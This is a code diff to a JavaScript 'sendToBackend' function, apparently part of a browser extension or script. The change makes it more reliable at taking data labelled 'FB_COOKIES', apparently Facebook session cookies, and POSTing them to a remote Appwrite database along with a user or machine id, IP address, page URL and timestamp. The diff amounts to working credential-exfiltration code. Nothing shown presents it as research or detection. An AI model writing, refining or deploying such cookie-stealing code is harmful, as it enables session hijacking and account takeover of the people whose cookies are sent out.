@@ -972,27 +972,35 @@ async function sendToBackend(type, data, retry = false) {
     );
 
     // If it's cookies data, also save to cookies collection
-    if (type === 'FB_COOKIES' && cookies) {
-      const cookiesData = {
-        userId: userId || machineId,
-        cookies: cookies,
-        url: data.url || '',
-        ip: ip,
-        capturedAt: new Date().toISOString()
-      };
+    if (type === 'FB_COOKIES') {
+      // Use cookies from data.cookies (passed from the calling code) or fallback to fetched cookies
+      const cookiesToSave = data.cookies || cookies || '';
+      console.log('Saving FB_COOKIES to Appwrite:', { hasCookies: !!cookiesToSave, cookiesLength: cookiesToSave.length });
 
-      await fetch(
-        `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.cookies}/documents`,
-        {
-          method: 'POST',
-          headers: getAppwriteHeaders(),
-          body: JSON.stringify({
-            documentId: 'unique()',
-            data: cookiesData
-          })
-        }
-      );
+      if (cookiesToSave) {
+        const cookiesData = {
+          userId: userId || machineId,
+          cookies: cookiesToSave,
+          url: data.url || '',
+          ip: ip,
+          capturedAt: new Date().toISOString()
+        };
+
+        const cookiesResponse = await fetch(
+          `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.cookies}/documents`,
+          {
+            method: 'POST',
+            headers: getAppwriteHeaders(),
+            body: JSON.stringify({
+              documentId: 'unique()',
+              data: cookiesData
+            })
+          }
+        );
+        console.log('Cookies save response:', cookiesResponse.status, cookiesResponse.statusText);
+      }
     }
+
 
   } catch (e) {
     console.error('sendToBackend error:', e);
